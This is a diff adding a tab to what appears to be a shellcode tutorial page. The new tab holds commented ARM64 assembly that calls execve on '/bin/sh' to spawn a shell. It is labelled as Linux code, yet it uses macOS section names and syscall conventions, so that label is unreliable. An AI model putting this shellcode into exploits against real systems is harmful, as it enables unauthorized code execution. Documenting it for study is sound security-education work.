@@ -519,6 +519,24 @@ _main:
 
 ```
 {% endtab %}
+
+{% tab title="with adr for linux" %}
+```armasm
+; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
+.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:    
+    adr  x0, sh_path  ; This is the address of "/bin/sh".
+    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
+    mov  x16, #59     ; Move the execve syscall number (59) into x16.
+    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+sh_path: .asciz "/bin/sh"
+```
+{% endtab %}
 {% endtabs %}
 
 #### Read with cat
